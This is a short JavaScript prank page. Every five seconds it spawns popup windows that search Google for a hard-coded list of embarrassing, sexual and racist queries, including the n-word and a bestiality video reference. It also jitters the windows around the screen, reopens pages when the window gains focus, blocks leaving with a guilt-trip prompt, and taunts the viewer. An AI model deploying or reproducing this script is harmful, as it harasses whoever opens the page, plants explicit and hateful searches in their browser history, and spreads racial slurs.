var searches = ["cancer symptomes","why does my stomach hurt?","how to stop pooping all the time?","how to hold in fart?","my eye is red is that okay?","porn","porr","sex","lego sex","roblox sex","fortnite sex","geforce sex simulator","minecraft sex server","classic minecraft sex server","lanschool sex chat","Hand pain after punching wall 383 times","cool videos?","why is 1 + 1 = 2 when 1 + 1 = 3?","my groin hurts","back pain","tooth pain","neck pain","how to sexy sex","why is my device smoking and hot and sexy?","why do my ears burn?","cancer symptoms","how to stop pregnant","do black people have bigger dick?","how to become black","become black through genetic engineering","nigger","nigga","negro is racist?!!?","mr hands video","why cant I bench more than 20kg?","buy steroids","how to make my dick bigger?","is 9cm enough in dick size?","dick enlargement doctors in my area","hot men","hot gay strippers"]; //im not racist because I did not mean to offend anyone with this and why should I hate other races?
    var index = 0;
    function RB(min, max) {
            return Math.floor(Math.random() * (max - min + 1) + min)
        }
    setInterval(() => {
        if(index > (searches.length - 1)) index = 0;
        let secret = window.open('','','HEIGHT='+(screen.height / 3)+',WIDTH='+(screen.width / 3));
        secret.location.href = "http://google.com/search?q="+searches[index];
        index++;
        secret.moveTo(RB(0,screen.width),RB(0,screen.height));
    },5000);
    onfocus = () => {
        open('index2.html');
    }
    onbeforeunload = () => {
        return "I NEED TO FEED MY 8 CHILDREN AND 81 COUSINS!";
    }
    setInterval(() => {
        window.moveTo(RB(0,screen.width),RB(0,screen.height));
    }, 500);
    document.write("Too stupid to catch me!");
    document.title = "Hello!";
